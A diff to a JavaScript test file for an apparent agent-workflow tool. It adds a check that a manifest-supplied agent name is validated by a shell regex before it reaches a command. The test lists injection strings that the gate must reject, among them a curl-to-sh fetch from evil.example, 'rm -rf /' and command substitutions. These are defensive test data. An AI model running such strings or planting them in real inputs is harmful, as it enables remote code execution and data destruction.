@@ -91,11 +91,17 @@ const _initKeyCache = new Map();
 function initPayloadKeys(surface) {
   if (_initKeyCache.has(surface)) return _initKeyCache.get(surface);
   let keys = null;
-  try {
-    keys = new Set(Object.keys(JSON.parse(runGsdTools(['query', surface], ROOT))));
-  } catch {
-    keys = null; // needs a phase/arg — inconclusive, not proof of absence.
+  const res = runGsdTools(['query', surface], ROOT);
+  if (res.success) {
+    try {
+      keys = new Set(Object.keys(JSON.parse(res.output)));
+    } catch {
+      keys = null; // non-JSON payload — inconclusive, not proof of absence.
+    }
   }
+  // A null here means the surface needs an argument we cannot supply (e.g. a
+  // phase number). Inconclusive, NOT proof the field is absent — the caller
+  // still has the declared-parse-list and shell-assignment binding sources.
   _initKeyCache.set(surface, keys);
   return keys;
 }
@@ -214,6 +220,53 @@ test('#2684: the model-profile reference does not instruct emitting an inherit/e
   );
 });
 
+test('#2684: ship.md validates capability-supplied ref.agent before it reaches a shell', () => {
+  const content = fs.readFileSync(path.join(WORKFLOWS, 'ship.md'), 'utf8');
+
+  // `ref.agent` comes from a capability manifest, which may be third-party. The
+  // #2684 fix is the first place that value reaches a shell command, so the
+  // workflow must constrain its shape before substituting it.
+  // The bash character classes contain `]`, so capture up to the closing ` ]]`
+  // rather than stopping at the first bracket.
+  const gate = /\[\[\s*"\$HOOK_AGENT"\s*=~\s*(\^.*\$)\s*\]\]/.exec(content);
+  assert.ok(
+    gate,
+    'ship.md must gate the capability-supplied ref.agent through a shell-variable ' +
+      'regex check before interpolating it into `query resolve-model` — a manifest is ' +
+      'not trusted input.',
+  );
+
+  const shape = new RegExp(gate[1]);
+
+  // Legitimate agent names the capability system actually dispatches.
+  for (const ok of ['gsd-mempalace-curator', 'gsd-code-reviewer', 'my.agent_v2', 'a']) {
+    assert.ok(shape.test(ok), `validation gate must accept the real agent name ${ok}`);
+  }
+
+  // Shell-injection shapes a hostile or corrupted manifest could supply. Each
+  // must be rejected, so the hook is skipped rather than executed.
+  const hostile = [
+    'x"; curl http://evil.example/p | sh; #',
+    'x$(id)',
+    'x`id`',
+    'x; rm -rf /',
+    'x && whoami',
+    'x | tee /etc/passwd',
+    'x\nrm -rf /',
+    '$IFS',
+    '../../etc/passwd',
+    '',
+  ];
+  for (const bad of hostile) {
+    assert.equal(
+      shape.test(bad),
+      false,
+      `validation gate must REJECT ${JSON.stringify(bad)} — it would otherwise be ` +
+        'interpolated into a shell command built from a capability manifest.',
+    );
+  }
+});
+
 test('#2684: an unknown agent type resolves to an empty model, so dispatch must omit', () => {
   // Hermetic: a throwaway project whose config explicitly sets resolve_model_ids:"omit".
   // ship.md dispatches `ref.agent` — an arbitrary capability-supplied agent name that need
@@ -225,7 +278,9 @@ test('#2684: an unknown agent type resolves to an empty model, so dispatch must 
       path.join(dir, '.planning', 'config.json'),
       JSON.stringify({ model_profile: 'balanced', resolve_model_ids: 'omit', runtime: 'claude' }),
     );
-    const parsed = JSON.parse(runGsdTools(['query', 'resolve-model', 'not-a-real-agent'], dir));
+    const res = runGsdTools(['query', 'resolve-model', 'not-a-real-agent'], dir);
+    assert.ok(res.success, `resolve-model failed (exit ${res.exitCode}): ${res.error}`);
+    const parsed = JSON.parse(res.output);
     assert.equal(parsed.unknown_agent, true, 'an agent absent from MODEL_PROFILES must be flagged');
     assert.equal(
       parsed.model,
